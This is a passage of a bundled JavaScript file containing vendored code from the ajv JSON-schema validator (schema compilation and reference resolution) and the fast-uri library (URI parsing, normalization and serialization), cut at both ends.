        (0, keyword_1.funcKeywordCode)(cxt, def);
      }
    }
    var JSON_POINTER = /^\/(?:[^~]|~0|~1)*$/;
    var RELATIVE_JSON_POINTER = /^([0-9]+)(#|\/(?:[^~]|~0|~1)*)?$/;
    function getData($data, { dataLevel, dataNames, dataPathArr }) {
      let jsonPointer;
      let data;
      if ($data === "")
        return names_1.default.rootData;
      if ($data[0] === "/") {
        if (!JSON_POINTER.test($data))
          throw new Error(`Invalid JSON-pointer: ${$data}`);
        jsonPointer = $data;
        data = names_1.default.rootData;
      } else {
        const matches = RELATIVE_JSON_POINTER.exec($data);
        if (!matches)
          throw new Error(`Invalid JSON-pointer: ${$data}`);
        const up = +matches[1];
        jsonPointer = matches[2];
        if (jsonPointer === "#") {
          if (up >= dataLevel)
            throw new Error(errorMsg("property/index", up));
          return dataPathArr[dataLevel - up];
        }
        if (up > dataLevel)
          throw new Error(errorMsg("data", up));
        data = dataNames[dataLevel - up];
        if (!jsonPointer)
          return data;
      }
      let expr = data;
      const segments = jsonPointer.split("/");
      for (const segment of segments) {
        if (segment) {
          data = (0, codegen_1._)`${data}${(0, codegen_1.getProperty)((0, util_1.unescapeJsonPointer)(segment))}`;
          expr = (0, codegen_1._)`${expr} && ${data}`;
        }
      }
      return expr;
      function errorMsg(pointerType, up) {
        return `Cannot access ${pointerType} ${up} levels up, current level is ${dataLevel}`;
      }
    }
    exports2.getData = getData;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/validation_error.js
var require_validation_error = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/validation_error.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var ValidationError = class extends Error {
      constructor(errors) {
        super("validation failed");
        this.errors = errors;
        this.ajv = this.validation = true;
      }
    };
    exports2.default = ValidationError;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/ref_error.js
var require_ref_error = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/ref_error.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var resolve_1 = require_resolve();
    var MissingRefError = class extends Error {
      constructor(resolver, baseId, ref, msg) {
        super(msg || `can't resolve reference ${ref} from id ${baseId}`);
        this.missingRef = (0, resolve_1.resolveUrl)(resolver, baseId, ref);
        this.missingSchema = (0, resolve_1.normalizeId)((0, resolve_1.getFullPath)(resolver, this.missingRef));
      }
    };
    exports2.default = MissingRefError;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/index.js
var require_compile = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.resolveSchema = exports2.getCompilingSchema = exports2.resolveRef = exports2.compileSchema = exports2.SchemaEnv = void 0;
    var codegen_1 = require_codegen();
    var validation_error_1 = require_validation_error();
    var names_1 = require_names();
    var resolve_1 = require_resolve();
    var util_1 = require_util();
    var validate_1 = require_validate();
    var SchemaEnv = class {
      constructor(env) {
        var _a;
        this.refs = {};
        this.dynamicAnchors = {};
        let schema;
        if (typeof env.schema == "object")
          schema = env.schema;
        this.schema = env.schema;
        this.schemaId = env.schemaId;
        this.root = env.root || this;
        this.baseId = (_a = env.baseId) !== null && _a !== void 0 ? _a : (0, resolve_1.normalizeId)(schema === null || schema === void 0 ? void 0 : schema[env.schemaId || "$id"]);
        this.schemaPath = env.schemaPath;
        this.localRefs = env.localRefs;
        this.meta = env.meta;
        this.$async = schema === null || schema === void 0 ? void 0 : schema.$async;
        this.refs = {};
      }
    };
    exports2.SchemaEnv = SchemaEnv;
    function compileSchema(sch) {
      const _sch = getCompilingSchema.call(this, sch);
      if (_sch)
        return _sch;
      const rootId = (0, resolve_1.getFullPath)(this.opts.uriResolver, sch.root.baseId);
      const { es5, lines } = this.opts.code;
      const { ownProperties } = this.opts;
      const gen = new codegen_1.CodeGen(this.scope, { es5, lines, ownProperties });
      let _ValidationError;
      if (sch.$async) {
        _ValidationError = gen.scopeValue("Error", {
          ref: validation_error_1.default,
          code: (0, codegen_1._)`require("ajv/dist/runtime/validation_error").default`
        });
      }
      const validateName = gen.scopeName("validate");
      sch.validateName = validateName;
      const schemaCxt = {
        gen,
        allErrors: this.opts.allErrors,
        data: names_1.default.data,
        parentData: names_1.default.parentData,
        parentDataProperty: names_1.default.parentDataProperty,
        dataNames: [names_1.default.data],
        dataPathArr: [codegen_1.nil],
        // TODO can its length be used as dataLevel if nil is removed?
        dataLevel: 0,
        dataTypes: [],
        definedProperties: /* @__PURE__ */ new Set(),
        topSchemaRef: gen.scopeValue("schema", this.opts.code.source === true ? { ref: sch.schema, code: (0, codegen_1.stringify)(sch.schema) } : { ref: sch.schema }),
        validateName,
        ValidationError: _ValidationError,
        schema: sch.schema,
        schemaEnv: sch,
        rootId,
        baseId: sch.baseId || rootId,
        schemaPath: codegen_1.nil,
        errSchemaPath: sch.schemaPath || (this.opts.jtd ? "" : "#"),
        errorPath: (0, codegen_1._)`""`,
        opts: this.opts,
        self: this
      };
      let sourceCode;
      try {
        this._compilations.add(sch);
        (0, validate_1.validateFunctionCode)(schemaCxt);
        gen.optimize(this.opts.code.optimize);
        const validateCode = gen.toString();
        sourceCode = `${gen.scopeRefs(names_1.default.scope)}return ${validateCode}`;
        if (this.opts.code.process)
          sourceCode = this.opts.code.process(sourceCode, sch);
        const makeValidate = new Function(`${names_1.default.self}`, `${names_1.default.scope}`, sourceCode);
        const validate = makeValidate(this, this.scope.get());
        this.scope.value(validateName, { ref: validate });
        validate.errors = null;
        validate.schema = sch.schema;
        validate.schemaEnv = sch;
        if (sch.$async)
          validate.$async = true;
        if (this.opts.code.source === true) {
          validate.source = { validateName, validateCode, scopeValues: gen._values };
        }
        if (this.opts.unevaluated) {
          const { props, items } = schemaCxt;
          validate.evaluated = {
            props: props instanceof codegen_1.Name ? void 0 : props,
            items: items instanceof codegen_1.Name ? void 0 : items,
            dynamicProps: props instanceof codegen_1.Name,
            dynamicItems: items instanceof codegen_1.Name
          };
          if (validate.source)
            validate.source.evaluated = (0, codegen_1.stringify)(validate.evaluated);
        }
        sch.validate = validate;
        return sch;
      } catch (e) {
        delete sch.validate;
        delete sch.validateName;
        if (sourceCode)
          this.logger.error("Error compiling schema, function code:", sourceCode);
        throw e;
      } finally {
        this._compilations.delete(sch);
      }
    }
    exports2.compileSchema = compileSchema;
    function resolveRef(root, baseId, ref) {
      var _a;
      ref = (0, resolve_1.resolveUrl)(this.opts.uriResolver, baseId, ref);
      const schOrFunc = root.refs[ref];
      if (schOrFunc)
        return schOrFunc;
      let _sch = resolve2.call(this, root, ref);
      if (_sch === void 0) {
        const schema = (_a = root.localRefs) === null || _a === void 0 ? void 0 : _a[ref];
        const { schemaId } = this.opts;
        if (schema)
          _sch = new SchemaEnv({ schema, schemaId, root, baseId });
      }
      if (_sch === void 0)
        return;
      return root.refs[ref] = inlineOrCompile.call(this, _sch);
    }
    exports2.resolveRef = resolveRef;
    function inlineOrCompile(sch) {
      if ((0, resolve_1.inlineRef)(sch.schema, this.opts.inlineRefs))
        return sch.schema;
      return sch.validate ? sch : compileSchema.call(this, sch);
    }
    function getCompilingSchema(schEnv) {
      for (const sch of this._compilations) {
        if (sameSchemaEnv(sch, schEnv))
          return sch;
      }
    }
    exports2.getCompilingSchema = getCompilingSchema;
    function sameSchemaEnv(s1, s2) {
      return s1.schema === s2.schema && s1.root === s2.root && s1.baseId === s2.baseId;
    }
    function resolve2(root, ref) {
      let sch;
      while (typeof (sch = this.refs[ref]) == "string")
        ref = sch;
      return sch || this.schemas[ref] || resolveSchema.call(this, root, ref);
    }
    function resolveSchema(root, ref) {
      const p = this.opts.uriResolver.parse(ref);
      const refPath = (0, resolve_1._getFullPath)(this.opts.uriResolver, p);
      let baseId = (0, resolve_1.getFullPath)(this.opts.uriResolver, root.baseId, void 0);
      if (Object.keys(root.schema).length > 0 && refPath === baseId) {
        return getJsonPointer.call(this, p, root);
      }
      const id = (0, resolve_1.normalizeId)(refPath);
      const schOrRef = this.refs[id] || this.schemas[id];
      if (typeof schOrRef == "string") {
        const sch = resolveSchema.call(this, root, schOrRef);
        if (typeof (sch === null || sch === void 0 ? void 0 : sch.schema) !== "object")
          return;
        return getJsonPointer.call(this, p, sch);
      }
      if (typeof (schOrRef === null || schOrRef === void 0 ? void 0 : schOrRef.schema) !== "object")
        return;
      if (!schOrRef.validate)
        compileSchema.call(this, schOrRef);
      if (id === (0, resolve_1.normalizeId)(ref)) {
        const { schema } = schOrRef;
        const { schemaId } = this.opts;
        const schId = schema[schemaId];
        if (schId)
          baseId = (0, resolve_1.resolveUrl)(this.opts.uriResolver, baseId, schId);
        return new SchemaEnv({ schema, schemaId, root, baseId });
      }
      return getJsonPointer.call(this, p, schOrRef);
    }
    exports2.resolveSchema = resolveSchema;
    var PREVENT_SCOPE_CHANGE = /* @__PURE__ */ new Set([
      "properties",
      "patternProperties",
      "enum",
      "dependencies",
      "definitions"
    ]);
    function getJsonPointer(parsedRef, { baseId, schema, root }) {
      var _a;
      if (((_a = parsedRef.fragment) === null || _a === void 0 ? void 0 : _a[0]) !== "/")
        return;
      for (const part of parsedRef.fragment.slice(1).split("/")) {
        if (typeof schema === "boolean")
          return;
        const partSchema = schema[(0, util_1.unescapeFragment)(part)];
        if (partSchema === void 0)
          return;
        schema = partSchema;
        const schId = typeof schema === "object" && schema[this.opts.schemaId];
        if (!PREVENT_SCOPE_CHANGE.has(part) && schId) {
          baseId = (0, resolve_1.resolveUrl)(this.opts.uriResolver, baseId, schId);
        }
      }
      let env;
      if (typeof schema != "boolean" && schema.$ref && !(0, util_1.schemaHasRulesButRef)(schema, this.RULES)) {
        const $ref = (0, resolve_1.resolveUrl)(this.opts.uriResolver, baseId, schema.$ref);
        env = resolveSchema.call(this, root, $ref);
      }
      const { schemaId } = this.opts;
      env = env || new SchemaEnv({ schema, schemaId, root, baseId });
      if (env.schema !== env.root.schema)
        return env;
      return void 0;
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/refs/data.json
var require_data = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/refs/data.json"(exports2, module2) {
    module2.exports = {
      $id: "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#",
      description: "Meta-schema for $data reference (JSON AnySchema extension proposal)",
      type: "object",
      required: ["$data"],
      properties: {
        $data: {
          type: "string",
          anyOf: [{ format: "relative-json-pointer" }, { format: "json-pointer" }]
        }
      },
      additionalProperties: false
    };
  }
});

// node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/lib/utils.js
var require_utils = __commonJS({
  "node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/lib/utils.js"(exports2, module2) {
    "use strict";
    var isUUID = RegExp.prototype.test.bind(/^[\da-f]{8}-[\da-f]{4}-[\da-f]{4}-[\da-f]{4}-[\da-f]{12}$/iu);
    var isIPv4 = RegExp.prototype.test.bind(/^(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)$/u);
    var isHexPair = RegExp.prototype.test.bind(/^[\da-f]{2}$/iu);
    var isUnreserved = RegExp.prototype.test.bind(/^[\da-z\-._~]$/iu);
    var isPathCharacter = RegExp.prototype.test.bind(/^[\da-z\-._~!$&'()*+,;=:@/]$/iu);
    function stringArrayToHexStripped(input) {
      let acc = "";
      let code = 0;
      let i = 0;
      for (i = 0; i < input.length; i++) {
        code = input[i].charCodeAt(0);
        if (code === 48) {
          continue;
        }
        if (!(code >= 48 && code <= 57 || code >= 65 && code <= 70 || code >= 97 && code <= 102)) {
          return "";
        }
        acc += input[i];
        break;
      }
      for (i += 1; i < input.length; i++) {
        code = input[i].charCodeAt(0);
        if (!(code >= 48 && code <= 57 || code >= 65 && code <= 70 || code >= 97 && code <= 102)) {
          return "";
        }
        acc += input[i];
      }
      return acc;
    }
    var nonSimpleDomain = RegExp.prototype.test.bind(/[^!"$&'()*+,\-.;=_`a-z{}~]/u);
    function consumeIsZone(buffer) {
      buffer.length = 0;
      return true;
    }
    function consumeHextets(buffer, address, output) {
      if (buffer.length) {
        const hex = stringArrayToHexStripped(buffer);
        if (hex !== "") {
          address.push(hex);
        } else {
          output.error = true;
          return false;
        }
        buffer.length = 0;
      }
      return true;
    }
    function getIPV6(input) {
      let tokenCount = 0;
      const output = { error: false, address: "", zone: "" };
      const address = [];
      const buffer = [];
      let endipv6Encountered = false;
      let endIpv6 = false;
      let consume = consumeHextets;
      for (let i = 0; i < input.length; i++) {
        const cursor = input[i];
        if (cursor === "[" || cursor === "]") {
          continue;
        }
        if (cursor === ":") {
          if (endipv6Encountered === true) {
            endIpv6 = true;
          }
          if (!consume(buffer, address, output)) {
            break;
          }
          if (++tokenCount > 7) {
            output.error = true;
            break;
          }
          if (i > 0 && input[i - 1] === ":") {
            endipv6Encountered = true;
          }
          address.push(":");
          continue;
        } else if (cursor === "%") {
          if (!consume(buffer, address, output)) {
            break;
          }
          consume = consumeIsZone;
        } else {
          buffer.push(cursor);
          continue;
        }
      }
      if (buffer.length) {
        if (consume === consumeIsZone) {
          output.zone = buffer.join("");
        } else if (endIpv6) {
          address.push(buffer.join(""));
        } else {
          address.push(stringArrayToHexStripped(buffer));
        }
      }
      output.address = address.join("");
      return output;
    }
    function normalizeIPv6(host) {
      if (findToken(host, ":") < 2) {
        return { host, isIPV6: false };
      }
      const ipv6 = getIPV6(host);
      if (!ipv6.error) {
        let newHost = ipv6.address;
        let escapedHost = ipv6.address;
        if (ipv6.zone) {
          newHost += "%" + ipv6.zone;
          escapedHost += "%25" + ipv6.zone;
        }
        return { host: newHost, isIPV6: true, escapedHost };
      } else {
        return { host, isIPV6: false };
      }
    }
    function findToken(str, token) {
      let ind = 0;
      for (let i = 0; i < str.length; i++) {
        if (str[i] === token) ind++;
      }
      return ind;
    }
    function removeDotSegments(path2) {
      let input = path2;
      const output = [];
      let nextSlash = -1;
      let len = 0;
      while (len = input.length) {
        if (len === 1) {
          if (input === ".") {
            break;
          } else if (input === "/") {
            output.push("/");
            break;
          } else {
            output.push(input);
            break;
          }
        } else if (len === 2) {
          if (input[0] === ".") {
            if (input[1] === ".") {
              break;
            } else if (input[1] === "/") {
              input = input.slice(2);
              continue;
            }
          } else if (input[0] === "/") {
            if (input[1] === "." || input[1] === "/") {
              output.push("/");
              break;
            }
          }
        } else if (len === 3) {
          if (input === "/..") {
            if (output.length !== 0) {
              output.pop();
            }
            output.push("/");
            break;
          }
        }
        if (input[0] === ".") {
          if (input[1] === ".") {
            if (input[2] === "/") {
              input = input.slice(3);
              continue;
            }
          } else if (input[1] === "/") {
            input = input.slice(2);
            continue;
          }
        } else if (input[0] === "/") {
          if (input[1] === ".") {
            if (input[2] === "/") {
              input = input.slice(2);
              continue;
            } else if (input[2] === ".") {
              if (input[3] === "/") {
                input = input.slice(3);
                if (output.length !== 0) {
                  output.pop();
                }
                continue;
              }
            }
          }
        }
        if ((nextSlash = input.indexOf("/", 1)) === -1) {
          output.push(input);
          break;
        } else {
          output.push(input.slice(0, nextSlash));
          input = input.slice(nextSlash);
        }
      }
      return output.join("");
    }
    var HOST_DELIMS = { "@": "%40", "/": "%2F", "?": "%3F", "#": "%23", ":": "%3A" };
    var HOST_DELIM_RE = /[@/?#:]/g;
    var HOST_DELIM_NO_COLON_RE = /[@/?#]/g;
    function reescapeHostDelimiters(host, isIP) {
      const re = isIP ? HOST_DELIM_NO_COLON_RE : HOST_DELIM_RE;
      re.lastIndex = 0;
      return host.replace(re, (ch) => HOST_DELIMS[ch]);
    }
    function normalizePercentEncoding(input, decodeUnreserved = false) {
      if (input.indexOf("%") === -1) {
        return input;
      }
      let output = "";
      for (let i = 0; i < input.length; i++) {
        if (input[i] === "%" && i + 2 < input.length) {
          const hex = input.slice(i + 1, i + 3);
          if (isHexPair(hex)) {
            const normalizedHex = hex.toUpperCase();
            const decoded = String.fromCharCode(parseInt(normalizedHex, 16));
            if (decodeUnreserved && isUnreserved(decoded)) {
              output += decoded;
            } else {
              output += "%" + normalizedHex;
            }
            i += 2;
            continue;
          }
        }
        output += input[i];
      }
      return output;
    }
    function normalizePathEncoding(input) {
      let output = "";
      for (let i = 0; i < input.length; i++) {
        if (input[i] === "%" && i + 2 < input.length) {
          const hex = input.slice(i + 1, i + 3);
          if (isHexPair(hex)) {
            const normalizedHex = hex.toUpperCase();
            const decoded = String.fromCharCode(parseInt(normalizedHex, 16));
            if (decoded !== "." && isUnreserved(decoded)) {
              output += decoded;
            } else {
              output += "%" + normalizedHex;
            }
            i += 2;
            continue;
          }
        }
        if (isPathCharacter(input[i])) {
          output += input[i];
        } else {
          output += escape(input[i]);
        }
      }
      return output;
    }
    function escapePreservingEscapes(input) {
      let output = "";
      for (let i = 0; i < input.length; i++) {
        if (input[i] === "%" && i + 2 < input.length) {
          const hex = input.slice(i + 1, i + 3);
          if (isHexPair(hex)) {
            output += "%" + hex.toUpperCase();
            i += 2;
            continue;
          }
        }
        output += escape(input[i]);
      }
      return output;
    }
    function recomposeAuthority(component) {
      const uriTokens = [];
      if (component.userinfo !== void 0) {
        uriTokens.push(component.userinfo);
        uriTokens.push("@");
      }
      if (component.host !== void 0) {
        let host = unescape(component.host);
        if (!isIPv4(host)) {
          const ipV6res = normalizeIPv6(host);
          if (ipV6res.isIPV6 === true) {
            host = `[${ipV6res.escapedHost}]`;
          } else {
            host = reescapeHostDelimiters(host, false);
          }
        }
        uriTokens.push(host);
      }
      if (typeof component.port === "number" || typeof component.port === "string") {
        uriTokens.push(":");
        uriTokens.push(String(component.port));
      }
      return uriTokens.length ? uriTokens.join("") : void 0;
    }
    module2.exports = {
      nonSimpleDomain,
      recomposeAuthority,
      reescapeHostDelimiters,
      normalizePercentEncoding,
      normalizePathEncoding,
      escapePreservingEscapes,
      removeDotSegments,
      isIPv4,
      isUUID,
      normalizeIPv6,
      stringArrayToHexStripped
    };
  }
});

// node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/lib/schemes.js
var require_schemes = __commonJS({
  "node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/lib/schemes.js"(exports2, module2) {
    "use strict";
    var { isUUID } = require_utils();
    var URN_REG = /([\da-z][\d\-a-z]{0,31}):((?:[\w!$'()*+,\-.:;=@]|%[\da-f]{2})+)/iu;
    var supportedSchemeNames = (
      /** @type {const} */
      [
        "http",
        "https",
        "ws",
        "wss",
        "urn",
        "urn:uuid"
      ]
    );
    function isValidSchemeName(name) {
      return supportedSchemeNames.indexOf(
        /** @type {*} */
        name
      ) !== -1;
    }
    function wsIsSecure(wsComponent) {
      if (wsComponent.secure === true) {
        return true;
      } else if (wsComponent.secure === false) {
        return false;
      } else if (wsComponent.scheme) {
        return wsComponent.scheme.length === 3 && (wsComponent.scheme[0] === "w" || wsComponent.scheme[0] === "W") && (wsComponent.scheme[1] === "s" || wsComponent.scheme[1] === "S") && (wsComponent.scheme[2] === "s" || wsComponent.scheme[2] === "S");
      } else {
        return false;
      }
    }
    function httpParse(component) {
      if (!component.host) {
        component.error = component.error || "HTTP URIs must have a host.";
      }
      return component;
    }
    function httpSerialize(component) {
      const secure = String(component.scheme).toLowerCase() === "https";
      if (component.port === (secure ? 443 : 80) || component.port === "") {
        component.port = void 0;
      }
      if (!component.path) {
        component.path = "/";
      }
      return component;
    }
    function wsParse(wsComponent) {
      wsComponent.secure = wsIsSecure(wsComponent);
      wsComponent.resourceName = (wsComponent.path || "/") + (wsComponent.query ? "?" + wsComponent.query : "");
      wsComponent.path = void 0;
      wsComponent.query = void 0;
      return wsComponent;
    }
    function wsSerialize(wsComponent) {
      if (wsComponent.port === (wsIsSecure(wsComponent) ? 443 : 80) || wsComponent.port === "") {
        wsComponent.port = void 0;
      }
      if (typeof wsComponent.secure === "boolean") {
        wsComponent.scheme = wsComponent.secure ? "wss" : "ws";
        wsComponent.secure = void 0;
      }
      if (wsComponent.resourceName) {
        const [path2, query] = wsComponent.resourceName.split("?");
        wsComponent.path = path2 && path2 !== "/" ? path2 : void 0;
        wsComponent.query = query;
        wsComponent.resourceName = void 0;
      }
      wsComponent.fragment = void 0;
      return wsComponent;
    }
    function urnParse(urnComponent, options) {
      if (!urnComponent.path) {
        urnComponent.error = "URN can not be parsed";
        return urnComponent;
      }
      const matches = urnComponent.path.match(URN_REG);
      if (matches) {
        const scheme = options.scheme || urnComponent.scheme || "urn";
        urnComponent.nid = matches[1].toLowerCase();
        urnComponent.nss = matches[2];
        const urnScheme = `${scheme}:${options.nid || urnComponent.nid}`;
        const schemeHandler = getSchemeHandler(urnScheme);
        urnComponent.path = void 0;
        if (schemeHandler) {
          urnComponent = schemeHandler.parse(urnComponent, options);
        }
      } else {
        urnComponent.error = urnComponent.error || "URN can not be parsed.";
      }
      return urnComponent;
    }
    function urnSerialize(urnComponent, options) {
      if (urnComponent.nid === void 0) {
        throw new Error("URN without nid cannot be serialized");
      }
      const scheme = options.scheme || urnComponent.scheme || "urn";
      const nid = urnComponent.nid.toLowerCase();
      const urnScheme = `${scheme}:${options.nid || nid}`;
      const schemeHandler = getSchemeHandler(urnScheme);
      if (schemeHandler) {
        urnComponent = schemeHandler.serialize(urnComponent, options);
      }
      const uriComponent = urnComponent;
      const nss = urnComponent.nss;
      uriComponent.path = `${nid || options.nid}:${nss}`;
      options.skipEscape = true;
      return uriComponent;
    }
    function urnuuidParse(urnComponent, options) {
      const uuidComponent = urnComponent;
      uuidComponent.uuid = uuidComponent.nss;
      uuidComponent.nss = void 0;
      if (!options.tolerant && (!uuidComponent.uuid || !isUUID(uuidComponent.uuid))) {
        uuidComponent.error = uuidComponent.error || "UUID is not valid.";
      }
      return uuidComponent;
    }
    function urnuuidSerialize(uuidComponent) {
      const urnComponent = uuidComponent;
      urnComponent.nss = (uuidComponent.uuid || "").toLowerCase();
      return urnComponent;
    }
    var http = (
      /** @type {SchemeHandler} */
      {
        scheme: "http",
        domainHost: true,
        parse: httpParse,
        serialize: httpSerialize
      }
    );
    var https = (
      /** @type {SchemeHandler} */
      {
        scheme: "https",
        domainHost: http.domainHost,
        parse: httpParse,
        serialize: httpSerialize
      }
    );
    var ws = (
      /** @type {SchemeHandler} */
      {
        scheme: "ws",
        domainHost: true,
        parse: wsParse,
        serialize: wsSerialize
      }
    );
    var wss = (
      /** @type {SchemeHandler} */
      {
        scheme: "wss",
        domainHost: ws.domainHost,
        parse: ws.parse,
        serialize: ws.serialize
      }
    );
    var urn = (
      /** @type {SchemeHandler} */
      {
        scheme: "urn",
        parse: urnParse,
        serialize: urnSerialize,
        skipNormalize: true
      }
    );
    var urnuuid = (
      /** @type {SchemeHandler} */
      {
        scheme: "urn:uuid",
        parse: urnuuidParse,
        serialize: urnuuidSerialize,
        skipNormalize: true
      }
    );
    var SCHEMES = (
      /** @type {Record<SchemeName, SchemeHandler>} */
      {
        http,
        https,
        ws,
        wss,
        urn,
        "urn:uuid": urnuuid
      }
    );
    Object.setPrototypeOf(SCHEMES, null);
    function getSchemeHandler(scheme) {
      return scheme && (SCHEMES[
        /** @type {SchemeName} */
        scheme
      ] || SCHEMES[
        /** @type {SchemeName} */
        scheme.toLowerCase()
      ]) || void 0;
    }
    module2.exports = {
      wsIsSecure,
      SCHEMES,
      isValidSchemeName,
      getSchemeHandler
    };
  }
});

// node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/index.js
var require_fast_uri = __commonJS({
  "node_modules/.pnpm/fast-uri@3.1.5/node_modules/fast-uri/index.js"(exports2, module2) {
    "use strict";
    var { normalizeIPv6, removeDotSegments, recomposeAuthority, normalizePercentEncoding, normalizePathEncoding, escapePreservingEscapes, reescapeHostDelimiters, isIPv4, nonSimpleDomain } = require_utils();
    var { SCHEMES, getSchemeHandler } = require_schemes();
    function normalize2(uri, options) {
      if (typeof uri === "string") {
        uri = /** @type {T} */
        normalizeString(uri, options);
      } else if (typeof uri === "object") {
        uri = /** @type {T} */
        parse3(serialize(uri, options), options);
      }
      return uri;
    }
    function resolve2(baseURI, relativeURI, options) {
      const schemelessOptions = options ? Object.assign({ scheme: "null" }, options) : { scheme: "null" };
      const { parsed: baseParsed, malformedAuthorityOrPort: baseMalformed } = parseWithStatus(baseURI, schemelessOptions);
      const { parsed: relativeParsed, malformedAuthorityOrPort: relativeMalformed } = parseWithStatus(relativeURI, schemelessOptions);
      if (baseMalformed || relativeMalformed) {
        throw new Error(baseParsed.error || relativeParsed.error || "URI is malformed.");
      }
      const resolved = resolveComponent(baseParsed, relativeParsed, schemelessOptions, true);
      schemelessOptions.skipEscape = true;
      return serialize(resolved, schemelessOptions);
    }
    function resolveComponent(base, relative2, options, skipNormalization) {
      const target = {};
      if (!skipNormalization) {
        base = parse3(serialize(base, options), options);
        relative2 = parse3(serialize(relative2, options), options);
      }
      options = options || {};
      if (!options.tolerant && relative2.scheme) {
        target.scheme = relative2.scheme;
        target.userinfo = relative2.userinfo;
        target.host = relative2.host;
        target.port = relative2.port;
        target.path = removeDotSegments(relative2.path || "");
        target.query = relative2.query;
      } else {
        if (relative2.userinfo !== void 0 || relative2.host !== void 0 || relative2.port !== void 0) {
          target.userinfo = relative2.userinfo;
          target.host = relative2.host;
          target.port = relative2.port;
          target.path = removeDotSegments(relative2.path || "");
          target.query = relative2.query;
        } else {
          if (!relative2.path) {
            target.path = base.path;
            if (relative2.query !== void 0) {
              target.query = relative2.query;
            } else {
              target.query = base.query;
            }
          } else {
            if (relative2.path[0] === "/") {
              target.path = removeDotSegments(relative2.path);
            } else {
              if ((base.userinfo !== void 0 || base.host !== void 0 || base.port !== void 0) && !base.path) {
                target.path = "/" + relative2.path;
              } else if (!base.path) {
                target.path = relative2.path;
              } else {
                target.path = base.path.slice(0, base.path.lastIndexOf("/") + 1) + relative2.path;
              }
              target.path = removeDotSegments(target.path);
            }
            target.query = relative2.query;
          }
          target.userinfo = base.userinfo;
          target.host = base.host;
          target.port = base.port;
        }
        target.scheme = base.scheme;
      }
      target.fragment = relative2.fragment;
      return target;
    }
    function equal(uriA, uriB, options) {
      const normalizedA = normalizeComparableURI(uriA, options);
      const normalizedB = normalizeComparableURI(uriB, options);
      return normalizedA !== void 0 && normalizedB !== void 0 && normalizedA.toLowerCase() === normalizedB.toLowerCase();
    }
    function serialize(cmpts, opts) {
      const component = {
        host: cmpts.host,
        scheme: cmpts.scheme,
        userinfo: cmpts.userinfo,
        port: cmpts.port,
        path: cmpts.path,
        query: cmpts.query,
        nid: cmpts.nid,
        nss: cmpts.nss,
        uuid: cmpts.uuid,
        fragment: cmpts.fragment,
        reference: cmpts.reference,
        resourceName: cmpts.resourceName,
        secure: cmpts.secure,
        error: ""
      };
      const options = Object.assign({}, opts);
      const uriTokens = [];
      const schemeHandler = getSchemeHandler(options.scheme || component.scheme);
      if (schemeHandler && schemeHandler.serialize) schemeHandler.serialize(component, options);
      if (component.path !== void 0) {
        if (!options.skipEscape) {
          component.path = escapePreservingEscapes(component.path);
          if (component.scheme !== void 0) {
            component.path = component.path.split("%3A").join(":");
          }
        } else {
          component.path = normalizePercentEncoding(component.path);
        }
      }
      if (options.reference !== "suffix" && component.scheme) {
        uriTokens.push(component.scheme, ":");
      }
      const authority = recomposeAuthority(component);
      if (authority !== void 0) {
        if (options.reference !== "suffix") {
          uriTokens.push("//");
        }
        uriTokens.push(authority);
        if (component.path && component.path[0] !== "/") {
          uriTokens.push("/");
        }
      }
      if (component.path !== void 0) {
        let s = component.path;
        if (!options.absolutePath && (!schemeHandler || !schemeHandler.absolutePath)) {
          s = removeDotSegments(s);
        }
        if (authority === void 0 && s[0] === "/" && s[1] === "/") {
          s = "/%2F" + s.slice(2);
        }
        uriTokens.push(s);
      }
      if (component.query !== void 0) {
        uriTokens.push("?", component.query);
      }
      if (component.fragment !== void 0) {
        uriTokens.push("#", component.fragment);
      }
      return uriTokens.join("");
    }
    var URI_PARSE = /^(?:([^#/:?]+):)?(?:\/\/((?:([^#/?@]*)@)?(\[[^#/?\]]+\]|[^#/:?]*)(?::(\d*))?))?([^#?]*)(?:\?([^#]*))?(?:#((?:.|[\n\r])*))?/u;
    var AUTHORITY_PREFIX = /^(?:[^#/:?]+:)?\/\/([^/?#]*)/;
    var AUTHORITY_INTRODUCER_REGION = /^(?:[^#/:?]+:)?([/\\\t\n\r]*)/;
    function getParseError(parsed, matches) {
      if (matches[2] !== void 0 && parsed.path && parsed.path[0] !== "/") {
        return 'URI path must start with "/" when authority is present.';
      }
      if (typeof parsed.port === "number" && (parsed.port < 0 || parsed.port > 65535)) {
        return "URI port is malformed.";
      }
      return void 0;
    }
    function parseWithStatus(uri, opts) {
      const options = Object.assign({}, opts);
      const parsed = {
        scheme: void 0,
        userinfo: void 0,
        host: "",
        port: void 0,
        path: "",
        query: void 0,
        fragment: void 0
      };
      let malformedAuthorityOrPort = false;
      let isIP = false;
      if (options.reference === "suffix") {
        if (options.scheme) {
          uri = options.scheme + ":" + uri;
        } else {
          uri = "//" + uri;
        }
      }
      const authorityMatch = uri.match(AUTHORITY_PREFIX);
      if (authorityMatch !== null && authorityMatch[1].indexOf("\\") !== -1) {
        parsed.error = "URI authority must not contain a literal backslash.";
        malformedAuthorityOrPort = true;
      }
      const introducerMatch = uri.match(AUTHORITY_INTRODUCER_REGION);
      if (introducerMatch !== null) {
        const region = introducerMatch[1];
        const normalizedRegion = region.replace(/[\t\n\r]/g, "");
        if (normalizedRegion.length >= 2) {
